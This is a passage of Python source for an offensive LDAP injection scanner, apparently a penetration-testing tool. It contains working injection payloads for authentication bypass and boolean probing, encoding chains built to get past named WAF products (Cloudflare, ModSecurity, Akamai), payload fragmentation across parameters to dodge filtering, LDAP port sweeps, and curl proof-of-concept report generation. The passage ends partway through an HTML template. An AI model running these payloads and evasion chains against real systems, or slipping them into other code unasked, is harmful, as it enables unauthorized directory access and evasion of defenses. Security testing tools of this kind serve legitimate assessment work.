        if graphql:  info(f"  [RPD] GraphQL endpoints: {graphql}")
        return openapi, graphql


# ═══════════════════════════════════════════════════════════════════════════════
# §V8-D  BEHAVIORAL RISK ANALYZER — Probe-Based Statistical Phase 3
# ═══════════════════════════════════════════════════════════════════════════════

class BehavioralRiskAnalyzer:
    """
    V8 — Replaces keyword-only Phase 3 heuristics with probe-driven
    behavioral analysis.

    Algorithm:
      1. Collect benign baseline for each param (no attack)
      2. Inject LDAP boolean-true and boolean-false probes
      3. Measure response delta: timing, size, content shift
      4. Apply IQR outlier detection — flag params with abnormal deltas
      5. Map parameter → function: auth / search / query / unknown
      6. Multi-signal correlation gate: require 2+ signals to upgrade to HIGH
      7. Feedback loop: confirmed injection results sharpen future probes

    Returns:
      Dict[param_name, BehavioralRiskScore]
    """

    @dataclass
    class BehavioralRiskScore:
        param:          str
        function_class: str    # "auth" | "search" | "query" | "filter" | "generic"
        timing_delta:   float  # ms delta vs baseline
        size_delta:     float  # relative body size change
        content_shift:  float  # Jaccard distance
        signal_count:   int    # how many signals fired
        risk_level:     str    # "HIGH" | "MEDIUM" | "LOW"
        evidence:       List[str] = field(default_factory=list)

    _BOOL_TRUE_PAYLOADS  = ["*", "*(|(objectClass=*))", "admin*)(&(|", "*)((|"]
    _BOOL_FALSE_PAYLOADS = ["xxx_nonexistent_zzz_9876", "\x00invalid", ")(invalid"]
    _TIMING_PAYLOADS     = ["*(|(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*))", "*(|(uid=*))"]

    _AUTH_PARAMS  = frozenset(["username","user","uid","login","email","principal",
                                "sAMAccountName","mail","bind","credential"])
    _SEARCH_PARAMS= frozenset(["search","query","q","filter","find","lookup",
                                "ldap_filter","searchterm","keyword"])
    _QUERY_PARAMS = frozenset(["dn","cn","ou","dc","base","basedn","objectclass",
                                "member","group","role","attribute"])

    def __init__(self, cfg: "ScanConfig", client: "HTTPClient",
                 memory: "ControlPlaneMemory"):
        self._cfg    = cfg
        self._client = client
        self._memory = memory

    def _classify_param_function(self, name: str) -> str:
        nl = name.lower()
        if any(p in nl for p in self._AUTH_PARAMS):   return "auth"
        if any(p in nl for p in self._SEARCH_PARAMS): return "search"
        if any(p in nl for p in self._QUERY_PARAMS):  return "query"
        return "generic"

    def _probe_param(self, ep: "Endpoint", param: str,
                     baseline_body: str, baseline_time: float,
                     ) -> "BehavioralRiskAnalyzer.BehavioralRiskScore":
        """Run behavioral probes on a single parameter."""
        timings:     List[float] = []
        size_deltas: List[float] = []
        content_sh:  List[float] = []
        evidence:    List[str]   = []
        signals      = 0

        baseline_len = len(baseline_body)

        for pl_raw in self._BOOL_TRUE_PAYLOADS[:2] + self._BOOL_FALSE_PAYLOADS[:2]:
            if not self._client._budget.acquire_for_phase("tier0"):
                break
            data = {p: (pl_raw if p == param else safe_val(p))
                    for p in ep.params}
            try:
                resp = self._client.send_endpoint(ep, data, phase="tier0")
                if resp is None:
                    continue
                t    = resp.elapsed.total_seconds()
                body = resp.text or ""
                timings.append(t)
                if baseline_len > 0:
                    size_deltas.append(abs(len(body) - baseline_len) / baseline_len)
                content_sh.append(sim_delta(baseline_body, body))
            except Exception:
                continue

        # Statistical outlier detection via IQR
        timing_delta  = 0.0
        size_delta    = 0.0
        content_shift = 0.0

        if timings and baseline_time > 0:
            med_t = statistics.median(timings)
            timing_delta = abs(med_t - baseline_time)
            if timing_delta > max(baseline_time * 0.4, 0.3):
                signals += 1
                evidence.append(f"timing_delta={timing_delta*1000:.0f}ms")

        if size_deltas:
            med_s = statistics.median(size_deltas)
            size_delta = med_s
            if med_s > 0.15:
                signals += 1
                evidence.append(f"size_shift={med_s:.1%}")

        if content_sh:
            med_c = statistics.median(content_sh)
            content_shift = med_c
            if med_c > 0.12:
                signals += 1
                evidence.append(f"content_shift={med_c:.1%}")

        # Multi-signal gate for HIGH
        if signals >= 2:
            risk = "HIGH"
        elif signals == 1:
            risk = "MEDIUM"
        else:
            risk = "LOW"

        return self.BehavioralRiskScore(
            param          = param,
            function_class = self._classify_param_function(param),
            timing_delta   = timing_delta * 1000,
            size_delta     = size_delta,
            content_shift  = content_shift,
            signal_count   = signals,
            risk_level     = risk,
            evidence       = evidence,
        )

    def analyze_endpoint(self, ep: "Endpoint"
                         ) -> Dict[str, "BehavioralRiskAnalyzer.BehavioralRiskScore"]:
        """
        Run behavioral probing for all parameters of an endpoint.
        Returns mapping param → BehavioralRiskScore.
        """
        results: Dict[str, "BehavioralRiskAnalyzer.BehavioralRiskScore"] = {}

        # Collect benign baseline for this endpoint
        bl_body = ""
        bl_time = 0.05
        try:
            if self._client._budget.acquire_for_phase("tier0"):
                bl_data = {p: safe_val(p) for p in ep.params}
                bl_resp = self._client.send_endpoint(ep, bl_data, phase="tier0")
                if bl_resp:
                    bl_body = bl_resp.text or ""
                    bl_time = bl_resp.elapsed.total_seconds()
        except Exception:
            pass

        for param in ep.params[:8]:  # Cap at 8 per endpoint for budget
            score = self._probe_param(ep, param, bl_body, bl_time)
            results[param] = score
            if score.risk_level == "HIGH":
                self._memory.record_param_signal(ep.url, param)

        return results


# ═══════════════════════════════════════════════════════════════════════════════
# §V8-E  ADAPTIVE BASELINE CIRCUIT BREAKER
# ═══════════════════════════════════════════════════════════════════════════════

class AdaptiveBaselineCircuitBreaker:
    """
    V8 — Wraps baseline collection with circuit-breaker pattern.

    Per-endpoint:
      - Detects rate-limiting (429 / timeout cluster) during baseline
      - Opens circuit on 3 consecutive failures → pauses, then half-open retry
      - Marks endpoint as unstable if instability > threshold
      - Prevents budget burn from collecting baselines on blocked endpoints

    States: CLOSED (normal) → OPEN (blocked) → HALF_OPEN (retry) → CLOSED
    """

    class State(Enum):
        CLOSED    = "CLOSED"
        OPEN      = "OPEN"
        HALF_OPEN = "HALF_OPEN"

    @dataclass
    class EPState:
        failures:      int   = 0
        state:         str   = "CLOSED"
        last_fail_ts:  float = 0.0
        retry_after:   float = 5.0

    _MAX_FAILURES    = 3
    _HALF_OPEN_WAIT  = 8.0   # seconds before retry
    _INSTABILITY_THR = 0.40  # CV threshold for "unstable" marking

    def __init__(self, memory: "ControlPlaneMemory"):
        self._memory = memory
        self._states: Dict[str, "AdaptiveBaselineCircuitBreaker.EPState"] = {}
        self._lock   = threading.Lock()

    def _get(self, url: str) -> "AdaptiveBaselineCircuitBreaker.EPState":
        with self._lock:
            if url not in self._states:
                self._states[url] = self.EPState()
            return self._states[url]

    def is_open(self, url: str) -> bool:
        st = self._get(url)
        if st.state == self.State.OPEN.value:
            if time.time() - st.last_fail_ts >= self._HALF_OPEN_WAIT:
                st.state = self.State.HALF_OPEN.value
                return False
            return True
        return False

    def on_success(self, url: str) -> None:
        st = self._get(url)
        st.failures = 0
        st.state    = self.State.CLOSED.value

    def on_failure(self, url: str, is_rate_limit: bool = False) -> bool:
        """
        Record a failure. Returns True if circuit just opened.
        """
        st = self._get(url)
        st.failures += 1
        st.last_fail_ts = time.time()

        if is_rate_limit:
            self._memory.record_rate_limit(url)

        if st.failures >= self._MAX_FAILURES:
            if st.state != self.State.OPEN.value:
                st.state = self.State.OPEN.value
                warn(f"  [CB] Circuit OPEN for {url} "
                     f"({st.failures} failures) — "
                     f"retry in {self._HALF_OPEN_WAIT:.0f}s")
                return True
        return False

    def wrap_collect(self, collector: "BaselineCollector",
                     ep: "Endpoint") -> Optional["Baseline"]:
        """
        Wraps a single baseline collection with circuit-breaker logic.
        """
        url = ep.url
        if self.is_open(url):
            warn(f"  [CB] Skipping baseline for {url} (circuit OPEN)")
            return None
        try:
            bl = collector.collect(ep)
            if bl is None:
                self.on_failure(url, is_rate_limit=False)
                return None
            self.on_success(url)
            return bl
        except Exception as exc:
            is_rl = "429" in str(exc) or "rate" in str(exc).lower()
            self.on_failure(url, is_rate_limit=is_rl)
            return None


# ═══════════════════════════════════════════════════════════════════════════════
# §V8-F  CHAINED PAYLOAD MUTATOR — Deep WAF-Adaptive Obfuscation
# ═══════════════════════════════════════════════════════════════════════════════

class ChainedPayloadMutator:
    """
    V8 — Deep mutation chains for polymorphic WAF bypass.

    Builds ordered mutation pipelines driven by:
      - WAF fingerprint (survived chars from Phase 1)
      - Memory of which encodings succeeded
      - Configurable chain depth (--poly-depth)

    Chain example (depth=3):
      raw → char_encode → url_encode → null_truncate

    Supports:
      - Fragmented injection (split across multiple params)
      - Unicode normalization bypass
      - Mixed encoding chains
      - Context-specific obfuscation (PHP vs Java vs Python)
    """

    _MUTATION_FUNCS = {
        "raw":              lambda x: x,
        "url":              lambda x: quote(x),
        "double_url":       lambda x: quote(quote(x)),
        "char_encode":      PayloadEngine.Mutator.char_encode,
        "hex_lower":        PayloadEngine.Mutator.hex_encode,
        "hex_upper":        PayloadEngine.Mutator.hex_upper_encode,
        "null_truncate":    lambda x: x + "\x00",
        "percent_null":     lambda x: x + "%00",
        "html_entity":      PayloadEngine.Mutator.html_entity_encode,
        "double_struct":    PayloadEngine.Mutator.double_url_structural,
        "unicode_star":     lambda x: x.replace("*", "\uff0a"),
        "unicode_lparen":   lambda x: x.replace("(", "\uff08").replace(")", "\uff09"),
        "tab_inject":       lambda x: x.replace(" ", "\t"),
        "cr_inject":        lambda x: x.replace(" ", "\r\n "),
        "comment_inject":   lambda x: re.sub(r'\s', "/**/", x),
    }

    # WAF-specific preferred mutation sequences
    _WAF_CHAINS: Dict[str, List[List[str]]] = {
        "Cloudflare": [
            ["char_encode", "url"],
            ["unicode_star", "url"],
            ["double_url"],
        ],
        "ModSecurity": [
            ["hex_upper", "url"],
            ["char_encode", "double_url"],
            ["html_entity"],
        ],
        "Akamai": [
            ["unicode_star", "unicode_lparen", "url"],
            ["double_struct"],
        ],
        "generic": [
            ["char_encode"],
            ["double_url"],
            ["hex_lower"],
            ["percent_null"],
        ],
    }

    def __init__(self, memory: "ControlPlaneMemory",
                 survived_chars: Optional[Set[str]] = None,
                 depth: int = 3):
        self._memory   = memory
        self._survived = survived_chars or set("*()|\\&\\")
        self._depth    = depth

    def _apply_chain(self, raw: str, chain: List[str]) -> str:
        result = raw
        for step in chain[:self._depth]:
            fn = self._MUTATION_FUNCS.get(step)
            if fn:
                try:
                    result = fn(result)
                except Exception:
                    pass
        return result

    def mutate(self, payload: "Payload",
               waf_name: Optional[str] = None,
               framework: str = "generic") -> List["Payload"]:
        """
        Generate N mutated variants of a payload using WAF-driven chains.
        Returns list of Payload objects with encoded_already=True.
        """
        waf_key = waf_name or self._memory.waf_name or "generic"
        chains  = self._WAF_CHAINS.get(waf_key, self._WAF_CHAINS["generic"])

        # Prefer chains using survived chars
        top_encs = self._memory.top_encodings(3)
        if top_encs:
            # Prepend memory-suggested encodings
            chains = [[enc] + ch for enc in top_encs
                      for ch in chains[:2]] + chains

        mutated: List["Payload"] = []
        seen:    Set[str]        = {payload.raw}

        for chain in chains[:6]:  # cap variants
            new_raw = self._apply_chain(payload.raw, chain)
            if new_raw in seen or new_raw == payload.raw:
                continue
            seen.add(new_raw)
            p = copy.copy(payload)
            p.raw = new_raw
            p.desc = f"{payload.desc} [chain:{'+'.join(chain)}]"
            p.encoded_already = True
            p.tier = PayloadTier.TIER5_MUTATION
            mutated.append(p)

        return mutated

    def fragment_payload(self, payload: "Payload",
                         params: List[str]) -> Optional[Dict[str, str]]:
        """
        Split injection across multiple parameters to evade per-param filtering.
        Returns dict of {param: partial_payload} or None if not feasible.
        """
        raw = payload.raw
        if len(params) < 2 or len(raw) < 4:
            return None
        mid    = len(raw) // 2
        p1, p2 = raw[:mid], raw[mid:]
        return {params[0]: p1, params[1]: p2}


# ═══════════════════════════════════════════════════════════════════════════════
# §V8-G  CONFIDENCE SCORER + IMPACT MAPPER
# ═══════════════════════════════════════════════════════════════════════════════

class ConfidenceScorer:
    """
    V8 — Probabilistic confidence scoring for each finding.

    Replaces binary CONFIRMED/PROBABLE with a 0-100 confidence value.
    Based on:
      - Number of detectors that fired
      - Signal scores
      - Verification steps passed
      - OOB callback
      - Reproducibility across replays
    """

    @staticmethod
    def score(det_result: "DetectionResult",
              verification_grade: str,
              oob_triggered: bool,
              replay_consistent: bool,
              signal_count: int) -> int:
        base = 0.0

        # Grade contribution
        grade_map = {"CONFIRMED": 60, "PROBABLE": 40, "CANDIDATE": 20, "REJECTED": 0}
        base += grade_map.get(verification_grade, 0)

        # Detector count
        base += min(signal_count * 5, 20)

        # OOB callback
        if oob_triggered:
            base += 15

        # Replay consistency
        if replay_consistent:
            base += 5

        # Raw detection score
        base += min(det_result.score * 2, 10)

        return min(int(base), 100)


class ImpactMapper:
    """
    V8 — Maps each LDAP injection technique to a real-world attack scenario.

    Returns structured impact dict with:
      - scenario: plain-English attack description
      - impact_type: authentication_bypass | data_exfiltration | enumeration
      - blast_radius: user | department | domain | all
      - attack_chain: list of steps attacker would take post-exploit
    """

    _TECHNIQUE_IMPACTS: Dict[str, Dict] = {
        "bypass": {
            "scenario":    "Authentication bypass — attacker logs in as any user without credentials",
            "impact_type": "authentication_bypass",
            "blast_radius":"all",
            "attack_chain":["Inject auth-bypass payload", "Receive session cookie",
                            "Access protected resources", "Escalate to admin"],
        },
        "boolean": {
            "scenario":    "Blind boolean extraction — attacker enumerates usernames, passwords, groups",
            "impact_type": "data_exfiltration",
            "blast_radius":"domain",
            "attack_chain":["Confirm boolean oracle", "Enumerate user attributes",
                            "Extract password hashes or tokens", "Lateral movement"],
        },
        "dn_inject": {
            "scenario":    "DN injection — attacker manipulates base DN to access other OUs",
            "impact_type": "unauthorized_access",
            "blast_radius":"department",
            "attack_chain":["Inject DN traversal", "Access sibling OUs",
                            "Read restricted attributes"],
        },
        "oob": {
            "scenario":    "Out-of-band exfiltration — LDAP server performs DNS/HTTP callback",
            "impact_type": "data_exfiltration",
            "blast_radius":"domain",
            "attack_chain":["Trigger OOB payload", "Receive DNS callback with data",
                            "Reconstruct exfiltrated values"],
        },
        "attr_harvest": {
            "scenario":    "Attribute harvesting — attacker reads LDAP attributes via blind extraction",
            "impact_type": "data_exfiltration",
            "blast_radius":"user",
            "attack_chain":["Confirm readable attributes", "Binary-search attribute values",
                            "Collect email, phone, memberOf"],
        },
        "enum": {
            "scenario":    "User/group enumeration — attacker confirms valid account names",
            "impact_type": "enumeration",
            "blast_radius":"domain",
            "attack_chain":["Probe common usernames", "Confirm existence via boolean",
                            "Build target list for password spray"],
        },
        "generic": {
            "scenario":    "LDAP injection — attacker manipulates directory queries",
            "impact_type": "injection",
            "blast_radius":"unknown",
            "attack_chain":["Send injection payload", "Observe behavioral difference",
                            "Escalate based on application context"],
        },
    }

    @classmethod
    def map_technique(cls, technique: str,
                      severity: str,
                      extracted_data: Optional[Dict] = None) -> Dict[str, Any]:
        family = _TECHNIQUE_TO_FAMILY.get(technique, "generic")
        impact = dict(cls._TECHNIQUE_IMPACTS.get(family, cls._TECHNIQUE_IMPACTS["generic"]))
        impact["severity"] = severity
        if extracted_data:
            impact["data_confirmed"] = list(extracted_data.keys())
        return impact

    @classmethod
    def retest_steps(cls, finding: "HandoffFinding") -> List[str]:
        """Generate concrete retest guidance for the finding."""
        steps = [
            f"1. Send baseline request: {finding.curl_poc.replace(finding.payload_raw, safe_val(finding.parameter_name))}",
            f"2. Confirm baseline is: {finding.baseline_response_class}",
            f"3. Replay injection: {finding.curl_poc}",
            f"4. Verify response is: {finding.injected_response_class}",
            f"5. Check signals: {', '.join(finding.detection_signals[:3])}",
        ]
        if finding.oob_triggered:
            steps.append("6. Monitor collaborator/DNS for callback from target server")
        return steps


# ═══════════════════════════════════════════════════════════════════════════════
# §V8-H  CROSS-ENDPOINT CORRELATOR — Store + Retrieve Correlation
# ═══════════════════════════════════════════════════════════════════════════════

class CrossEndpointCorrelator:
    """
    V8 — Correlates findings across endpoints to detect stored/second-order
    LDAP injection chains.

    Pattern: Endpoint A stores data → Endpoint B retrieves and queries it
    via LDAP → injection propagates through the system.

    Also flags:
      - Multiple confirmed endpoints sharing the same parameter name
      - Auth endpoints feeding data to search endpoints
    """

    def __init__(self):
        self._findings:    List["HandoffFinding"]     = []
        self._ep_by_param: Dict[str, List[str]]       = defaultdict(list)
        self._lock         = threading.Lock()

    def register(self, finding: "HandoffFinding") -> None:
        with self._lock:
            self._findings.append(finding)
            self._ep_by_param[finding.parameter_name].append(finding.endpoint_url)

    def correlate(self) -> List[Dict[str, Any]]:
        """
        Find cross-endpoint chains. Returns list of correlation records.
        """
        correlations: List[Dict] = []
        with self._lock:
            findings = list(self._findings)

        confirmed = [f for f in findings
                     if f.verification_grade == "CONFIRMED"]
        probable  = [f for f in findings
                     if f.verification_grade == "PROBABLE"]

        # Pattern 1: Same param injectable in multiple endpoints
        for param, urls in self._ep_by_param.items():
            if len(urls) >= 2:
                correlations.append({
                    "type":        "multi_endpoint_param",
                    "param":       param,
                    "endpoints":   list(dict.fromkeys(urls)),
                    "description": (
                        f"Parameter '{param}' is injectable across "
                        f"{len(urls)} endpoints — potential stored injection chain"
                    ),
                    "severity":    "HIGH",
                })

        # Pattern 2: Auth + Search chain
        auth_findings   = [f for f in confirmed
                           if f.payload_technique in ("bypass", "auth_bypass")]
        search_findings = [f for f in confirmed + probable
                           if "search" in f.payload_technique.lower()
                           or "bool" in f.payload_technique.lower()]
        if auth_findings and search_findings:
            correlations.append({
                "type":        "auth_search_chain",
                "auth_ep":     auth_findings[0].endpoint_url,
                "search_ep":   search_findings[0].endpoint_url,
                "description": (
                    "Auth bypass + boolean search — attacker can bypass login, "
                    "then enumerate directory via search endpoint"
                ),
                "severity":    "CRITICAL",
            })

        return correlations

    def enrich_handoff(self, handoff: "ScanHandoff") -> None:
        """Attach correlations to handoff document."""
        correlations = self.correlate()
        if correlations:
            handoff.__dict__["cross_endpoint_correlations"] = correlations
            info(f"  [Correlator] {len(correlations)} cross-endpoint chain(s) identified")


# ═══════════════════════════════════════════════════════════════════════════════
# §V11-LC  TARGET LIVENESS CHECKER — Pre-flight DNS + TCP + HTTP validation
# ═══════════════════════════════════════════════════════════════════════════════

class TargetLivenessChecker:
    """
    V11 — Phase 0 pre-flight: ensures target is actually reachable before
    spending request budget. Checks DNS → TCP ports → HTTP HEAD.
    Fail-fast on dead targets; flags indeterminate for ambiguous results.
    """

    _LDAP_PORTS  = [389, 636, 3268, 3269]
    _HTTP_PORTS  = [80, 443, 8080, 8443]
    _PROBE_TIMEOUT = 4.0

    def __init__(self, cfg: "ScanConfig"):
        self._cfg = cfg

    def check(self) -> Dict[str, Any]:
        """
        Returns dict:
          live          bool   — overall liveness verdict
          dns_ok        bool   — DNS resolved
          resolved_ip   str
          open_ports    list   — TCP ports reachable
          http_ok       bool   — HTTP HEAD returned < 500
          http_status   int
          ldap_ports    list   — LDAP-family ports open
          confidence    str    — high|medium|low|dead
          reason        str
        """
        result: Dict[str, Any] = {
            "live": False, "dns_ok": False, "resolved_ip": "",
            "open_ports": [], "http_ok": False, "http_status": 0,
            "ldap_ports": [], "confidence": "dead", "reason": "",
        }
        parsed = urlparse(self._cfg.target)
        host   = parsed.hostname or self._cfg.target
        scheme = parsed.scheme or "https"
        port_hint = parsed.port or (443 if scheme == "https" else 80)

        # ── Step 1: DNS resolution ────────────────────────────────────────────
        try:
            ip = socket.gethostbyname(host)
            result["dns_ok"]     = True
            result["resolved_ip"]= ip
        except socket.gaierror as exc:
            result["reason"]     = f"DNS resolution failed: {exc}"
            result["confidence"] = "dead"
            return result

        # ── Step 2: TCP port reachability ─────────────────────────────────────
        probe_ports = list({port_hint, 80, 443})
        open_ports: List[int] = []
        for port in probe_ports:
            try:
                with socket.create_connection((host, port),
                                               timeout=self._PROBE_TIMEOUT):
                    open_ports.append(port)
            except (OSError, socket.timeout):
                pass
        result["open_ports"] = open_ports

        # ── Step 3: LDAP port sweep ───────────────────────────────────────────
        ldap_open: List[int] = []
        for port in self._LDAP_PORTS:
            try:
                with socket.create_connection((host, port),
                                               timeout=self._PROBE_TIMEOUT):
                    ldap_open.append(port)
            except (OSError, socket.timeout):
                pass
        result["ldap_ports"] = ldap_open

        # ── Step 4: HTTP HEAD probe ───────────────────────────────────────────
        http_ok = False
        http_status = 0
        if open_ports:
            try:
                sess = requests.Session()
                head = sess.head(
                    self._cfg.target,
                    timeout  = self._PROBE_TIMEOUT,
                    verify   = self._cfg.verify_ssl,
                    allow_redirects = True,
                )
                http_status = head.status_code
                http_ok     = head.status_code < 500
            except Exception:
                # Try GET fallback
                try:
                    r = requests.get(
                        self._cfg.target, timeout=self._PROBE_TIMEOUT,
                        verify=self._cfg.verify_ssl, stream=True)
                    http_status = r.status_code
                    http_ok     = r.status_code < 500
                    r.close()
                except Exception:
                    pass
        result["http_ok"]     = http_ok
        result["http_status"] = http_status

        # ── Step 5: Confidence scoring ────────────────────────────────────────
        if http_ok and result["dns_ok"]:
            result["confidence"] = "high"
            result["live"]       = True
        elif result["dns_ok"] and open_ports and not http_ok:
            result["confidence"] = "medium"
            result["live"]       = True
            result["reason"]     = f"TCP open but HTTP returned {http_status}"
        elif result["dns_ok"] and not open_ports:
            result["confidence"] = "low"
            result["live"]       = False
            result["reason"]     = "DNS ok but no TCP ports reachable"
        else:
            result["confidence"] = "dead"
            result["live"]       = False
            result["reason"]     = "Target unreachable"

        return result


# ═══════════════════════════════════════════════════════════════════════════════
# §V11-CP  CROSS-PARAMETER VALIDATOR — Phase 3 multi-param anomaly confirmation
# ═══════════════════════════════════════════════════════════════════════════════

class CrossParamValidator:
    """
    V11 — After detecting anomaly in param A, probes sibling parameters to
    confirm the behavioral difference propagates across the endpoint.
    Reduces false positives from endpoint-level volatility.
    """

    def __init__(self, client: "HTTPClient", cfg: "ScanConfig"):
        self._client = client
        self._cfg    = cfg

    def validate(
        self,
        ep:       "Endpoint",
        trigger_param: str,
        trigger_payload: str,
        baseline: "Baseline",
        pipeline: "DetectionPipeline",
        budget:   "AdaptiveBudgetManager",
    ) -> Dict[str, Any]:
        """
        Inject trigger_payload into trigger_param, then probe the OTHER params
        with benign values. Returns cross-param correlation record.
        """
        result = {
            "cross_param_confirmed": False,
            "sibling_anomalies":     [],
            "confidence_boost":      0,
        }

        # Collect sibling params (exclude trigger)
        siblings = [p for p in ep.params if p != trigger_param][:4]
        if not siblings:
            return result

        anomaly_count = 0
        for sibling in siblings:
            if not budget.acquire_injection():
                break

            # Build data: trigger param injected, sibling with safe value,
            # rest with benign defaults
            data = {}
            for p in ep.params:
                if p == trigger_param:
                    data[p] = trigger_payload
                elif p == sibling:
                    data[p] = safe_val(sibling)  # deliberately benign
                else:
                    data[p] = baseline.replay_params.get(p, safe_val(p))

            resp = self._client.send_endpoint(ep, data, phase="verification")
            if resp is None:
                continue

            det = pipeline.run(resp, baseline,
                               Payload(raw=trigger_payload, desc="cross-param",
                                       technique="cross_param",
                                       tier=PayloadTier.TIER1_CORE))
            if det.fired:
                anomaly_count += 1
                result["sibling_anomalies"].append({
                    "sibling": sibling, "score": det.score,
                })

        if anomaly_count >= 2:
            result["cross_param_confirmed"] = True
            result["confidence_boost"]      = 20
        elif anomaly_count == 1:
            result["confidence_boost"]      = 10

        return result


# ═══════════════════════════════════════════════════════════════════════════════
# §V11-ET  EXECUTION TRACER — Structured audit of every decision
# ═══════════════════════════════════════════════════════════════════════════════

class ExecutionTracer:
    """
    V11 — Records every phase decision, payload outcome, and verification step.
    Feeds Phase 5 execution_trace in handoff JSON and HTML report.
    """

    def __init__(self):
        self._trace: List[Dict] = []
        self._lock  = threading.Lock()

    def log(self, phase: str, action: str, detail: str,
            outcome: str = "ok", endpoint: str = "",
            payload: str = "") -> None:
        entry = {
            "ts":       now_iso(),
            "phase":    phase,
            "action":   action,
            "detail":   detail,
            "outcome":  outcome,
            "endpoint": endpoint,
            "payload":  payload[:120] if payload else "",
        }
        with self._lock:
            self._trace.append(entry)

    def get(self) -> List[Dict]:
        with self._lock:
            return list(self._trace)


# ═══════════════════════════════════════════════════════════════════════════════
# §V11-HR  HTML REPORT GENERATOR — Phase 5 structured HTML output
# ═══════════════════════════════════════════════════════════════════════════════

class HTMLReportGenerator:
    """
    V11 — Generates a self-contained HTML report from the handoff document.
    Includes: executive summary, per-finding PoC, remediation, execution trace.
    """

    _SEVERITY_COLOR = {
        "CRITICAL": "#ff2c2c", "HIGH": "#ff8c00",
        "MEDIUM":   "#ffd700", "LOW":  "#6fa8dc",
    }

    @staticmethod
    def _esc(s: str) -> str:
        return (str(s)
                .replace("&", "&amp;").replace("<", "&lt;")
                .replace(">", "&gt;").replace('"', "&quot;"))

    @classmethod
    def generate(cls, handoff: "ScanHandoff", trace: List[Dict]) -> str:
        h = cls._esc
        ts  = handoff.timestamp_end or now_iso()
        tgt = h(handoff.target)

        all_findings: List[Dict] = (
            handoff.confirmed_findings +
            handoff.probable_findings  +
            handoff.candidate_findings
        )

        crits  = sum(1 for f in all_findings if f.get("severity") == "CRITICAL")
        highs  = sum(1 for f in all_findings if f.get("severity") == "HIGH")
        conf   = len(handoff.confirmed_findings)
        prob   = len(handoff.probable_findings)
        raw_c  = len(handoff.raw_ldap_findings)

        # ── Severity badge helper ─────────────────────────────────────────────
        def badge(sev: str) -> str:
            col = cls._SEVERITY_COLOR.get(sev, "#aaa")
            return (f'<span style="background:{col};color:#000;'
                    f'padding:2px 8px;border-radius:3px;font-weight:bold;'
                    f'font-size:0.8em">{h(sev)}</span>')

        # ── Finding cards ─────────────────────────────────────────────────────
        finding_html = ""
        for idx, f in enumerate(all_findings, 1):
            sev   = f.get("severity", "MEDIUM")
            grade = h(f.get("verification_grade", "CANDIDATE"))
            poc   = h(f.get("curl_poc", ""))
            remediation = h(f.get("remediation_guidance", "Sanitize LDAP inputs; use parameterized queries."))
            evidence    = h(f.get("ldap_error_snippet", "") or "")
            impact      = h(f.get("impact_scenario", ""))
            sig         = h(", ".join(f.get("detection_signals", [])[:4]))
            alt_pls     = f.get("alternative_payloads", [])
            alt_html    = ""
            if alt_pls:
                alt_html = "<br><b>Alt payloads:</b><br>" + "<br>".join(
                    f'<code>{h(p)}</code>' for p in alt_pls[:3])

            finding_html += f"""
<div class="finding" style="border-left:4px solid {cls._SEVERITY_COLOR.get(sev,'#aaa')};
     padding:14px;margin:16px 0;background:#1a1a1a;border-radius:4px">
  <div style="display:flex;align-items:center;gap:10px;margin-bottom:8px">
    <span style="font-size:1.1em;font-weight:bold;color:#fff">#{idx}</span>
    {badge(sev)}
    <span style="color:#aaa">{grade}</span>
    <span style="color:#6fa8dc">{h(f.get('http_method','GET'))}</span>
    <span style="color:#eee">{h(f.get('endpoint_url',''))}</span>
  </div>
  <table style="width:100%;border-collapse:collapse;font-size:0.9em">
    <tr><td style="color:#aaa;width:140px">Parameter</td>
        <td style="color:#ff8c00;font-weight:bold">{h(f.get('parameter_name',''))}</td></tr>
    <tr><td style="color:#aaa">Technique</td>
        <td style="color:#c0c">{h(f.get('payload_technique',''))}</td></tr>
    <tr><td style="color:#aaa">Confidence</td>
        <td style="color:#0f0">{h(str(f.get('reproduction_confidence',0)))}%</td></tr>
    <tr><td style="color:#aaa">Signals</td>
        <td style="color:#999">{sig}</td></tr>
    {"<tr><td style='color:#aaa'>Evidence</td><td style='color:#6fa8dc'><code>" + evidence + "</code></td></tr>" if evidence else ""}
    {"<tr><td style='color:#aaa'>Impact</td><td style='color:#ffd700'>" + impact + "</td></tr>" if impact else ""}
  </table>
  <div style="margin-top:10px">
    <b style="color:#aaa">PoC (curl)</b>
    <pre style="background:#111;padding:10px;overflow-x:auto;border-radius:3px;
                color:#0f0;font-size:0.82em">{poc}</pre>
    {alt_html}
  </div>
  <div style="margin-top:8px;padding:8px;background:#111;border-radius:3px">
    <b style="color:#ff8c00">Remediation:</b>
    <span style="color:#ccc"> {remediation}</span>
  </div>
</div>"""

        # ── Raw LDAP findings ─────────────────────────────────────────────────
        raw_html = ""
        for rf in handoff.raw_ldap_findings:
            raw_html += f"""
<div style="border-left:4px solid #ff2c2c;padding:10px;margin:10px 0;background:#1a1a1a">
  <b style="color:#ff2c2c">{h(rf.get('finding_type',''))}</b>
  <span style="color:#aaa"> — {h(rf.get('host',''))}:{h(str(rf.get('port','')))} </span>
  <span style="color:#ffd700">[{h(str(rf.get('severity','')))}]</span><br>
  <code style="color:#6fa8dc">{h(str(rf.get('evidence',''))[:200])}</code>
</div>"""

        # ── Execution trace table ─────────────────────────────────────────────
        trace_rows = ""
        for entry in trace[-200:]:   # cap at 200 rows
            oc_col = "#0f0" if entry.get("outcome") == "ok" else "#f80"
            trace_rows += f"""<tr>
  <td style="color:#555;font-size:0.78em">{h(entry.get('ts','')[-8:])}</td>
  <td style="color:#6fa8dc">{h(entry.get('phase',''))}</td>
  <td>{h(entry.get('action',''))}</td>
  <td style="color:#aaa;font-size:0.82em">{h(str(entry.get('detail',''))[:80])}</td>
  <td style="color:{oc_col}">{h(entry.get('outcome',''))}</td>
</tr>"""

        # ── Cross-endpoint chains ─────────────────────────────────────────────
        chain_html = ""
        for ch in getattr(handoff, "cross_endpoint_correlations", []):
            sev_col = "#ff2c2c" if ch.get("severity") == "CRITICAL" else "#ff8c00"
            chain_html += f"""
<div style="border-left:3px solid {sev_col};padding:8px;margin:8px 0;background:#1a1a1a">
  <b style="color:{sev_col}">[{h(ch.get('severity',''))}]</b>
  <span style="color:#eee"> {h(ch.get('description',''))}</span>
</div>"""

        waf_str = f"YES — {h(handoff.waf_name)} [{h(handoff.waf_confidence)}]" if handoff.waf_detected else f"No [{h(handoff.waf_confidence)}]"

        html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>LDAPi Report — {tgt}</title>
<style>
  *{{box-sizing:border-box;margin:0;padding:0}}
